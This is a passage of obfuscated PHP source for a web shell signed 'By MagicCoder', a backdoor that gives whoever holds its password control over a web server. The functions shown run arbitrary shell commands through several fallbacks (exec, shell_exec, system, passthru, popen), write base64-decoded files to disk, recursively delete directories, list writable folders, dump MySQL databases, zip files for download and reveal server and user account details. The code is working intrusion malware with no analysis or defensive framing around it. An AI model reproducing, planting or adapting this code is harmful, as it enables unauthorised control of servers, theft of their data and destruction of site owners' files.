$_SERVER['SERVER_NAME']), 3 => array('Server IP', gethostbyname($_SERVER['SERVER_NAME'])), 4 => array('Server OS', PHP_OS), 5 => array('Server OS Charset', $_SERVER['HTTP_ACCEPT_LANGUAGE']), 6 => array('Server Software', $_SERVER['SERVER_SOFTWARE']), 7 => array('Server Web Port', $_SERVER['SERVER_PORT']), 8 => array('PHP run mode', strtoupper(php_sapi_name())), 9 => array('The file path', __FILE__), 10 => array('PHP Version', PHP_VERSION), 11 => array('PHPINFO', IS_PHPINFO ? '<a href="javascript:goaction(\'phpinfo\');">Yes</a>' : 'No'), 12 => array('Safe Mode', getcfg('safe_mode')), 13 => array('Administrator', $speb9c05), 14 => array('allow_url_fopen', getcfg('allow_url_fopen')), 15 => array('enable_dl', getcfg('enable_dl')), 16 => array('display_errors', getcfg('display_errors')), 17 => array('register_globals', getcfg('register_globals')), 18 => array('magic_quotes_gpc', getcfg('magic_quotes_gpc')), 19 => array('memory_limit', getcfg('memory_limit')), 20 => array('post_max_size', getcfg('post_max_size')), 21 => array('upload_max_filesize', $sp13f526), 22 => array('max_execution_time', getcfg('max_execution_time') . ' second(s)'), 23 => array('disable_functions', $sp4c12e2)); if ($sp80aae3) { m($sp80aae3 . ' : ' . getcfg($sp80aae3)); } formhead(array('title' => 'Server environment')); makehide('action', 'phpenv'); makeinput(array('title' => 'Please input PHP configuration parameter(eg:magic_quotes_gpc)', 'name' => 'phpvarname', 'value' => $sp80aae3, 'newline' => 1)); formfooter(); $sp02df5c = array(0 => 'Server', 1 => 'PHP'); for ($sp5955cc = 0; $sp5955cc < 2; $sp5955cc++) { p('<h2>' . $sp02df5c[$sp5955cc] . ' &raquo;</h2>'); p('<ul class="info">'); if ($sp5955cc == 0) { for ($sp6c3e91 = 1; $sp6c3e91 <= 9; $sp6c3e91++) { p('<li><u>' . $spea4fcd[$sp6c3e91][0] . ':</u>' . $spea4fcd[$sp6c3e91][1] . '</li>'); } } elseif ($sp5955cc == 1) { for ($sp6c3e91 = 10; $sp6c3e91 <= 23; $sp6c3e91++) { p('<li><u>' . $spea4fcd[$sp6c3e91][0] . ':</u>' . $spea4fcd[$sp6c3e91][1] . '</li>'); } } p('</ul>'); } } else { m('Undefined Action'); echo '<br><br>'; if ($spd2ab61 == 'phpinfo') { if (IS_PHPINFO) { phpinfo(); } else { $sp61abc1 = 'phpinfo() function has non-permissible'; } } } ?>
</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
	<span style="float:right;"><?php  debuginfo(); ob_end_flush(); ?>
</span>
	By MagicCoder
</div>
</body>
</html>

<?php  function m($sp37b7d8) { echo '<div style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;">'; echo $sp37b7d8; echo '</div>'; } function scookie($sp8b00ef, $spc3da4d, $sp085909 = 0, $sp36b6c2 = 1) { global $spc90b55, $sp0b64ce, $_SERVER; $sp8b00ef = ($sp36b6c2 ? $spc90b55['cookiepre'] : '') . $sp8b00ef; $sp085909 = $sp085909 ? $sp085909 : $spc90b55['cookielife']; $spc8d9fa = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0; setcookie($sp8b00ef, $spc3da4d, $sp0b64ce + $sp085909, $spc90b55['cookiepath'], $spc90b55['cookiedomain'], $spc8d9fa); } function multi($spdaa25b, $sp52d1bf, $sp9351ff, $sp455fbb) { $sp945ae5 = ''; if ($spdaa25b > $sp52d1bf) { $sp2cc5f8 = 10; $sp7202aa = 5; $sp501ed7 = @ceil($spdaa25b / $sp52d1bf); if ($sp2cc5f8 > $sp501ed7) { $spf6268a = 1; $sp438846 = $sp501ed7; } else { $spf6268a = $sp9351ff - $sp7202aa; $sp438846 = $sp9351ff + $sp2cc5f8 - $sp7202aa - 1; if ($spf6268a < 1) { $sp438846 = $sp9351ff + 1 - $spf6268a; $spf6268a = 1; if ($sp438846 - $spf6268a < $sp2cc5f8 && $sp438846 - $spf6268a < $sp501ed7) { $sp438846 = $sp2cc5f8; } } elseif ($sp438846 > $sp501ed7) { $spf6268a = $sp9351ff - $sp501ed7 + $sp438846; $sp438846 = $sp501ed7; if ($sp438846 - $spf6268a < $sp2cc5f8 && $sp438846 - $spf6268a < $sp501ed7) { $spf6268a = $sp501ed7 - $sp2cc5f8 + 1; } } } $sp945ae5 = ($sp9351ff - $sp7202aa > 1 && $sp501ed7 > $sp2cc5f8 ? '<a href="javascript:settable(\'' . $sp455fbb . '\', \'\', 1);">First</a> ' : '') . ($sp9351ff > 1 ? '<a href="javascript:settable(\'' . $sp455fbb . '\', \'\', ' . ($sp9351ff - 1) . ');">Prev</a> ' : ''); for ($sp6c3e91 = $spf6268a; $sp6c3e91 <= $sp438846; $sp6c3e91++) { $sp945ae5 .= $sp6c3e91 == $sp9351ff ? $sp6c3e91 . ' ' : '<a href="javascript:settable(\'' . $sp455fbb . '\', \'\', ' . $sp6c3e91 . ');">[' . $sp6c3e91 . ']</a> '; } $sp945ae5 .= ($sp9351ff < $sp501ed7 ? '<a href="javascript:settable(\'' . $sp455fbb . '\', \'\', ' . ($sp9351ff + 1) . ');">Next</a>' : '') . ($sp438846 < $sp501ed7 ? ' <a href="javascript:settable(\'' . $sp455fbb . '\', \'\', ' . $sp501ed7 . ');">Last</a>' : ''); $sp945ae5 = $sp945ae5 ? '<p>Pages: ' . $sp945ae5 . '</p>' : ''; } return $sp945ae5; } function loginpage() { ?>
	<style type="text/css">
	input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
	</style>
	<form method="POST" action="">
	<span style="font:11px Verdana;">Password: </span><input name="password" type="password" size="20">
	<input type="hidden" name="doing" value="login">
	<input type="submit" value="Login">
	</form>
<?php  die; } function execute($spdc9908) { $spfd181b = ''; if ($spdc9908) { if (function_exists('exec')) { @exec($spdc9908, $spfd181b); $spfd181b = join('
', $spfd181b); } elseif (function_exists('shell_exec')) { $spfd181b = @shell_exec($spdc9908); } elseif (function_exists('system')) { @ob_start(); @system($spdc9908); $spfd181b = @ob_get_contents(); @ob_end_clean(); } elseif (function_exists('passthru')) { @ob_start(); @passthru($spdc9908); $spfd181b = @ob_get_contents(); @ob_end_clean(); } elseif (@is_resource($sp224638 = @popen($spdc9908, 'r'))) { $spfd181b = ''; while (!@feof($sp224638)) { $spfd181b .= @fread($sp224638, 1024); } @pclose($sp224638); } } return $spfd181b; } function which($sp518998) { $sp49de29 = execute("which {$sp518998}"); return $sp49de29 ? $sp49de29 : $sp518998; } function cf($spe74d00, $sp2583e7) { if ($sp694629 = @fopen($spe74d00, 'w')) { @fputs($sp694629, @base64_decode($sp2583e7)); @fclose($sp694629); } } function debuginfo() { global $spe4271b; $sp18e70c = explode(' ', microtime()); $spc2c02d = number_format($sp18e70c[1] + $sp18e70c[0] - $spe4271b, 6); echo 'Processed in ' . $spc2c02d . ' second(s)'; } function dbconn($spf65dbc, $sp9d1e01, $sp686c1a, $spf835c8 = '', $spe887a2 = '', $spa00579 = '3306') { if (!($sp89e107 = @mysql_connect($spf65dbc . ':' . $spa00579, $sp9d1e01, $sp686c1a))) { p('<h2>Can not connect to MySQL server</h2>'); die; } if ($sp89e107 && $spf835c8) { if (!@mysql_select_db($spf835c8, $sp89e107)) { p('<h2>Database selected has error</h2>'); die; } } if ($sp89e107 && mysql_get_server_info() > '4.1') { if (in_array(strtolower($spe887a2), array('gbk', 'big5', 'utf8'))) { q("SET character_set_connection={$spe887a2}, character_set_results={$spe887a2}, character_set_client=binary;", $sp89e107); } } return $sp89e107; } function s_array(&$sp6dfc07) { if (is_array($sp6dfc07)) { foreach ($sp6dfc07 as $sp71a197 => $spe2ff4f) { $sp6dfc07[$sp71a197] = s_array($spe2ff4f); } } else { if (is_string($sp6dfc07)) { $sp6dfc07 = stripslashes($sp6dfc07); } } return $sp6dfc07; } function html_clean($sp1c78b4) { $sp1c78b4 = htmlspecialchars($sp1c78b4); $sp1c78b4 = str_replace('
', '<br />', $sp1c78b4); $sp1c78b4 = str_replace('  ', '&nbsp;&nbsp;', $sp1c78b4); $sp1c78b4 = str_replace('	', '&nbsp;&nbsp;&nbsp;&nbsp;', $sp1c78b4); return $sp1c78b4; } function getChmod($spcc8ef6) { return substr(base_convert(@fileperms($spcc8ef6), 10, 8), -4); } function getPerms($spcc8ef6) { $sp9dace2 = @fileperms($spcc8ef6); if (($sp9dace2 & 49152) === 49152) { $spb06e63 = 's'; } elseif (($sp9dace2 & 16384) === 16384) { $spb06e63 = 'd'; } elseif (($sp9dace2 & 40960) === 40960) { $spb06e63 = 'l'; } elseif (($sp9dace2 & 32768) === 32768) { $spb06e63 = '-'; } elseif (($sp9dace2 & 24576) === 24576) { $spb06e63 = 'b'; } elseif (($sp9dace2 & 8192) === 8192) { $spb06e63 = 'c'; } elseif (($sp9dace2 & 4096) === 4096) { $spb06e63 = 'p'; } else { $spb06e63 = '?'; } $sp0581a1['read'] = $sp9dace2 & 256 ? 'r' : '-'; $sp0581a1['write'] = $sp9dace2 & 128 ? 'w' : '-'; $sp0581a1['execute'] = $sp9dace2 & 64 ? 'x' : '-'; $spbaefbe['read'] = $sp9dace2 & 32 ? 'r' : '-'; $spbaefbe['write'] = $sp9dace2 & 16 ? 'w' : '-'; $spbaefbe['execute'] = $sp9dace2 & 8 ? 'x' : '-'; $spa53dc9['read'] = $sp9dace2 & 4 ? 'r' : '-'; $spa53dc9['write'] = $sp9dace2 & 2 ? 'w' : '-'; $spa53dc9['execute'] = $sp9dace2 & 1 ? 'x' : '-'; if ($sp9dace2 & 2048) { $sp0581a1['execute'] = $sp0581a1['execute'] == 'x' ? 's' : 'S'; } if ($sp9dace2 & 1024) { $spbaefbe['execute'] = $spbaefbe['execute'] == 'x' ? 's' : 'S'; } if ($sp9dace2 & 512) { $spa53dc9['execute'] = $spa53dc9['execute'] == 'x' ? 't' : 'T'; } return $spb06e63 . $sp0581a1['read'] . $sp0581a1['write'] . $sp0581a1['execute'] . $spbaefbe['read'] . $spbaefbe['write'] . $spbaefbe['execute'] . $spa53dc9['read'] . $spa53dc9['write'] . $spa53dc9['execute']; } echo '[syslog]04
'; function getUser($spcc8ef6) { if (function_exists('posix_getpwuid')) { $sp6dfc07 = @posix_getpwuid(@fileowner($spcc8ef6)); if ($sp6dfc07 && is_array($sp6dfc07)) { return ' / <a href="#" title="User: ' . $sp6dfc07['name'] . '&#13&#10Passwd: ' . $sp6dfc07['passwd'] . '&#13&#10Uid: ' . $sp6dfc07['uid'] . '&#13&#10gid: ' . $sp6dfc07['gid'] . '&#13&#10Gecos: ' . $sp6dfc07['gecos'] . '&#13&#10Dir: ' . $sp6dfc07['dir'] . '&#13&#10Shell: ' . $sp6dfc07['shell'] . '">' . $sp6dfc07['name'] . '</a>'; } } return ''; } function deltree($sp712bfd) { $spff8269 = @dir($sp712bfd); while (@($spa3ecf0 = $spff8269->read())) { if (is_dir($sp712bfd . '/' . $spa3ecf0) && $spa3ecf0 != '.' && $spa3ecf0 != '..') { @chmod($sp712bfd . '/' . $spa3ecf0, 511); deltree($sp712bfd . '/' . $spa3ecf0); } if (is_file($sp712bfd . '/' . $spa3ecf0)) { @chmod($sp712bfd . '/' . $spa3ecf0, 511); @unlink($sp712bfd . '/' . $spa3ecf0); } } $spff8269->close(); @chmod($sp712bfd, 511); return @rmdir($sp712bfd) ? 1 : 0; } function bg() { global $spcfa701; return $spcfa701++ % 2 == 0 ? 'alt1' : 'alt2'; } function getPath($spaa95a8, $sp43bee6) { if ($sp43bee6 == '.') { $sp43bee6 = $spaa95a8; } $sp43bee6 = str_replace('\\', '/', $sp43bee6); $sp43bee6 = str_replace('//', '/', $sp43bee6); if (substr($sp43bee6, -1) != '/') { $sp43bee6 = $sp43bee6 . '/'; } return $sp43bee6; } function getUpPath($sp43bee6) { $sp9ace05 = explode('/', $sp43bee6); $spdaa25b = count($sp9ace05); if ($spdaa25b > 2) { unset($sp9ace05[$spdaa25b - 1], $sp9ace05[$spdaa25b - 2]); } $sp619726 = implode('/', $sp9ace05) . '/'; $sp619726 = str_replace('//', '/', $sp619726); return $sp619726; } function getcfg($sp3f18f5) { $spea30d5 = 'true'; if ($spea30d5 == 0) { return 'No'; } elseif ($spea30d5 == 1) { return 'Yes'; } else { return $spea30d5; } } function getfun($sp1c08ae) { return false !== function_exists($sp1c08ae) ? 'Yes' : 'No'; } function GetList($spa25e24) { global $sp8e4b9a, $spc9281a, $sp43bee6; !$spc9281a && ($spc9281a = 1); if ($sp232d7c = @opendir($spa25e24)) { while ($spa3ecf0 = readdir($sp232d7c)) { $sp224638 = str_replace('//', '/', $spa25e24 . '/' . $spa3ecf0); if ($spa3ecf0 != '.' && $spa3ecf0 != '..' && is_dir($sp224638)) { if (is_writable($sp224638)) { $sp8e4b9a[$spc9281a]['filename'] = str_replace($sp43bee6, '', $sp224638); $sp8e4b9a[$spc9281a]['mtime'] = @date('Y-m-d H:i:s', filemtime($sp224638)); $sp8e4b9a[$spc9281a]['dirchmod'] = getChmod($sp224638); $sp8e4b9a[$spc9281a]['dirperm'] = getPerms($sp224638); $sp8e4b9a[$spc9281a]['dirlink'] = ue($spa25e24); $sp8e4b9a[$spc9281a]['server_link'] = $sp224638; $sp8e4b9a[$spc9281a]['client_link'] = ue($sp224638); $spc9281a++; } GetList($sp224638); } } closedir($sp232d7c); clearstatcache(); return $sp8e4b9a; } else { return array(); } } function qy($spabcb3f) { $spfd181b = $spf785f6 = ''; if (!($spfd181b = @mysql_query($spabcb3f))) { return 0; } else { if (is_resource($spfd181b)) { return 1; } else { return 2; } } return 0; } function q($spabcb3f) { return @mysql_query($spabcb3f); } function fr($spc15d86) { mysql_free_result($spc15d86); } function sizecount($sp92ea66) { if ($sp92ea66 > 1073741824) { $sp92ea66 = round($sp92ea66 / 1073741824 * 100) / 100 . ' G'; } elseif ($sp92ea66 > 1048576) { $sp92ea66 = round($sp92ea66 / 1048576 * 100) / 100 . ' M'; } elseif ($sp92ea66 > 1024) { $sp92ea66 = round($sp92ea66 / 1024 * 100) / 100 . ' K'; } else { $sp92ea66 = $sp92ea66 . ' B'; } return $sp92ea66; } class PHPZip { var $out = ''; function PHPZip($spa25e24) { if (@function_exists('gzcompress')) { $sp07714d = getcwd(); if (is_array($spa25e24)) { $sp225924 = $spa25e24; } else { $sp225924 = $this->GetFileList($spa25e24); foreach ($sp225924 as $sp71a197 => $spe2ff4f) { $sp225924[] = substr($spe2ff4f, strlen($spa25e24) + 1); } } if (!empty($spa25e24) && !is_array($spa25e24) && file_exists($spa25e24)) { chdir($spa25e24); } else { chdir($sp07714d); } if (count($sp225924) > 0) { foreach ($sp225924 as $spbc6552) { if (is_file($spbc6552)) { $sp6ec574 = fopen($spbc6552, 'r'); $sp1c78b4 = @fread($sp6ec574, filesize($spbc6552)); fclose($sp6ec574); if (is_array($spa25e24)) { $spbc6552 = basename($spbc6552); } $this->addFile($sp1c78b4, $spbc6552); } } $this->out = $this->file(); chdir($sp07714d); } return 1; } else { return 0; } } function GetFileList($spa25e24) { static $sp5955cc; if (is_dir($spa25e24)) { if ($sp232d7c = opendir($spa25e24)) { while ($spa3ecf0 = readdir($sp232d7c)) { if ($spa3ecf0 != '.' && $spa3ecf0 != '..') { $sp224638 = $spa25e24 . '/' . $spa3ecf0; if (is_dir($sp224638)) { $this->GetFileList($sp224638); } $sp5955cc[] = $sp224638; } } closedir($sp232d7c); } } return $sp5955cc; } var $datasec = array(); var $ctrl_dir = array(); var $eof_ctrl_dir = 'PK    '; var $old_offset = 0; function unix2DosTime($sp27f7d7 = 0) { $sp5283e0 = $sp27f7d7 == 0 ? getdate() : getdate($sp27f7d7); if ($sp5283e0['year'] < 1980) { $sp5283e0['year'] = 1980; $sp5283e0['mon'] = 1; $sp5283e0['mday'] = 1; $sp5283e0['hours'] = 0; $sp5283e0['minutes'] = 0; $sp5283e0['seconds'] = 0; } return $sp5283e0['year'] - 1980 << 25 | $sp5283e0['mon'] << 21 | $sp5283e0['mday'] << 16 | $sp5283e0['hours'] << 11 | $sp5283e0['minutes'] << 5 | $sp5283e0['seconds'] >> 1; } function addFile($spabbf84, $sp19dd0c, $spdec3d1 = 0) { $sp19dd0c = str_replace('\\', '/', $sp19dd0c); $spa78cc1 = dechex($this->unix2DosTime($spdec3d1)); $spd7a397 = '\\x' . $spa78cc1[6] . $spa78cc1[7] . '\\x' . $spa78cc1[4] . $spa78cc1[5] . '\\x' . $spa78cc1[2] . $spa78cc1[3] . '\\x' . $spa78cc1[0] . $spa78cc1[1]; eval('$hexdtime = "' . $spd7a397 . '";'); $sp84051f = 'PK'; $sp84051f .= ' '; $sp84051f .= '  '; $sp84051f .= ' '; $sp84051f .= $spd7a397; $sp2cc504 = strlen($spabbf84); $sp5e852c = crc32($spabbf84); $spb4ecf6 = gzcompress($spabbf84); $sp2ca0b2 = strlen($spb4ecf6); $spb4ecf6 = substr(substr($spb4ecf6, 0, strlen($spb4ecf6) - 4), 2); $sp84051f .= pack('V', $sp5e852c); $sp84051f .= pack('V', $sp2ca0b2); $sp84051f .= pack('V', $sp2cc504); $sp84051f .= pack('v', strlen($sp19dd0c)); $sp84051f .= pack('v', 0); $sp84051f .= $sp19dd0c; $sp84051f .= $spb4ecf6; $sp84051f .= pack('V', $sp5e852c); $sp84051f .= pack('V', $sp2ca0b2); $sp84051f .= pack('V', $sp2cc504); $this->datasec[] = $sp84051f; $sp103956 = strlen(implode('', $this->datasec)); $sp92ebdf = 'PK'; $sp92ebdf .= '  '; $sp92ebdf .= ' '; $sp92ebdf .= '  '; $sp92ebdf .= ' '; $sp92ebdf .= $spd7a397; $sp92ebdf .= pack('V', $sp5e852c); $sp92ebdf .= pack('V', $sp2ca0b2); $sp92ebdf .= pack('V', $sp2cc504); $sp92ebdf .= pack('v', strlen($sp19dd0c)); $sp92ebdf .= pack('v', 0); $sp92ebdf .= pack('v', 0); $sp92ebdf .= pack('v', 0); $sp92ebdf .= pack('v', 0); $sp92ebdf .= pack('V', 32); $sp92ebdf .= pack('V', $this->old_offset); $this->old_offset = $sp103956; $sp92ebdf .= $sp19dd0c; $this->ctrl_dir[] = $sp92ebdf; } function file() { $spabbf84 = implode('', $this->datasec); $sp438bb4 = implode('', $this->ctrl_dir); return $spabbf84 . $sp438bb4 . $this->eof_ctrl_dir . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($sp438bb4)) . pack('V', strlen($spabbf84)) . '  '; } } function sqldumptable($sp4297b3, $sp694629 = 0) { $sp1cceb8 = "DROP TABLE IF EXISTS {$sp4297b3};\n"; $sp1cceb8 .= "CREATE TABLE {$sp4297b3} (\n"; $sp0baa35 = 1; $sp9e6a11 = q("SHOW FIELDS FROM {$sp4297b3}"); while ($spb5262f = mysql_fetch_array($sp9e6a11)) { if (!$sp0baa35) { $sp1cceb8 .= ',
'; } else { $sp0baa35 = 0; } $sp1cceb8 .= "   {$spb5262f['Field']} {$spb5262f['Type']}"; if (!empty($spb5262f['Default'])) { $sp1cceb8 .= " DEFAULT '{$spb5262f['Default']}'"; } if ($spb5262f['Null'] != 'YES') { $sp1cceb8 .= ' NOT NULL'; } if ($spb5262f['Extra'] != '') { $sp1cceb8 .= " {$spb5262f['Extra']}"; } } fr($sp9e6a11); $spa22ace = q("SHOW KEYS FROM {$sp4297b3}"); while ($sp8b00ef = mysql_fetch_array($spa22ace)) { $sp5fd4dd = $sp8b00ef['Key_name']; if ($sp5fd4dd != 'PRIMARY' && $sp8b00ef['Non_unique'] == 0) { $sp5fd4dd = "UNIQUE|{$sp5fd4dd}"; } if (!is_array($spe2a956[$sp5fd4dd])) { $spe2a956[$sp5fd4dd] = array(); } $spe2a956[$sp5fd4dd][] = $sp8b00ef['Column_name']; } fr($spa22ace); while (list($sp5fd4dd, $sp98a32a) = @each($spe2a956)) { $sp1cceb8 .= ',
'; $sp773f55 = implode($sp98a32a, ','); if ($sp5fd4dd == 'PRIMARY') { $sp1cceb8 .= "   PRIMARY KEY ({$sp773f55})"; } else { if (substr($sp5fd4dd, 0, 6) == 'UNIQUE') { $sp5fd4dd = substr($sp5fd4dd, 7); } $sp1cceb8 .= "   KEY {$sp5fd4dd} ({$sp773f55})"; } } $sp1cceb8 .= '
);

'; if ($sp694629) { fwrite($sp694629, $sp1cceb8); } else { echo $sp1cceb8; } $spb7d784 = q("SELECT * FROM {$sp4297b3}"); $spe92b26 = mysql_num_fields($spb7d784); while ($spa53ce4 = mysql_fetch_array($spb7d784)) { $sp1cceb8 = "INSERT INTO {$sp4297b3} VALUES("; $sp9b86f4 = -1; $sp0baa35 = 1; while (++$sp9b86f4 < $spe92b26) { if (!$sp0baa35) { $sp1cceb8 .= ', '; } else { $sp0baa35 = 0; } if (!isset($spa53ce4[$sp9b86f4])) { $sp1cceb8 .= 'NULL'; } else { $sp1cceb8 .= '\'' . mysql_escape_string($spa53ce4[$sp9b86f4]) . '\''; } } $sp1cceb8 .= ');
'; if ($sp694629) { fwrite($sp694629, $sp1cceb8); } else { echo $sp1cceb8; } } fr($spb7d784); if ($sp694629) { fwrite($sp694629, '
'); } else { echo '
'; } } function ue($sp6ff357) { return urlencode($sp6ff357); } function p($sp6ff357) { echo $sp6ff357 . '
'; } function tbhead() { p('<table width="100%" border="0" cellpadding="4" cellspacing="0">'); } function tbfoot() { p('</table>'); } function makehide($sp19dd0c, $spc3da4d = '') { p("<input id=\"{$sp19dd0c}\" type=\"hidden\" name=\"{$sp19dd0c}\" value=\"{$spc3da4d}\" />"); } function makeinput($spab949a = array()) { $spab949a['size'] = $spab949a['size'] > 0 ? "size=\"{$spab949a['size']}\"" : 'size="100"'; $spab949a['extra'] = $spab949a['extra'] ? $spab949a['extra'] : ''; !$spab949a['type'] && ($spab949a['type'] = 'text'); $spab949a['title'] = $spab949a['title'] ? $spab949a['title'] . '<br />' : ''; $spab949a['class'] = $spab949a['class'] ? $spab949a['class'] : 'input'; if ($spab949a['newline']) { p("<p>{$spab949a['title']}<input class=\"{$spab949a['class']}\" name=\"{$spab949a['name']}\" id=\"{$spab949a['name']}\" value=\"{$spab949a['value']}\" type=\"{$spab949a['type']}\" {$spab949a['size']} {$spab949a['extra']} /></p>"); } else { p("{$spab949a['title']}<input class=\"{$spab949a['class']}\" name=\"{$spab949a['name']}\" id=\"{$spab949a['name']}\" value=\"{$spab949a['value']}\" type=\"{$spab949a['type']}\" {$spab949a['size']} {$spab949a['extra']} />"); } } function makeselect($spab949a = array()) { if ($spab949a['onchange']) { $spc62263 = 'onchange="' . $spab949a['onchange'] . '"'; } $spab949a['title'] = $spab949a['title'] ? $spab949a['title'] : ''; if ($spab949a['newline']) { p('<p>'); } p("{$spab949a['title']} <select class=\"input\" id=\"{$spab949a['name']}\" name=\"{$spab949a['name']}\" {$spc62263}>"); if (is_array($spab949a['option'])) { foreach ($spab949a['option'] as $sp8b00ef => $spc3da4d) { if ($spab949a['selected'] == $sp8b00ef) { p("<option value=\"{$sp8b00ef}\" selected>{$spc3da4d}</option>"); } else { p("<option value=\"{$sp8b00ef}\">{$spc3da4d}</option>"); } } } p('</select>'); if ($spab949a['newline']) { p('</p>'); } } function formhead($spab949a = array()) { !$spab949a['method'] && ($spab949a['method'] = 'post'); !$spab949a['action'] && ($spab949a['action'] = $spa5bde5); $spab949a['target'] = $spab949a['target'] ? "target=\"{$spab949a['target']}\"" : ''; !$spab949a['name'] && ($spab949a['name'] = 'form1'); p("<form name=\"{$spab949a['name']}\" id=\"{$spab949a['name']}\" action=\"{$spab949a['action']}\" method=\"{$spab949a['method']}\" {$spab949a['target']}>"); if ($spab949a['title']) { p('<h2>' . $spab949a['title'] . ' &raquo;</h2>'); } } function maketext($spab949a = array()) { !$spab949a['cols'] && ($spab949a['cols'] = 100); !$spab949a['rows'] && ($spab949a['rows'] = 25); $spab949a['title'] = $spab949a['title'] ? $spab949a['title'] . '<br />' : ''; p("<p>{$spab949a['title']}<textarea class=\"area\" id=\"{$spab949a['name']}\" name=\"{$spab949a['name']}\" cols=\"{$spab949a['cols']}\" rows=\"{$spab949a['rows']}\" {$spab949a['extra']}>{$spab949a['value']}</textarea></p>"); } function formfooter($sp19dd0c = '') { !$sp19dd0c && ($sp19dd0c = 'submit'); p('<p><input class="bt" name="' . $sp19dd0c . '" id=\\"' . $sp19dd0c . '\\" type="submit" value="Submit"></p>'); p('</form>'); } function formfoot() { p('</form>'); } function pr($sp5955cc) { echo '<pre>'; print_r($sp5955cc); echo '</pre>'; } echo '[syslog]05
'; ?>
</td></tr></table>
</td></tr>
</tr>
</table>
<?php 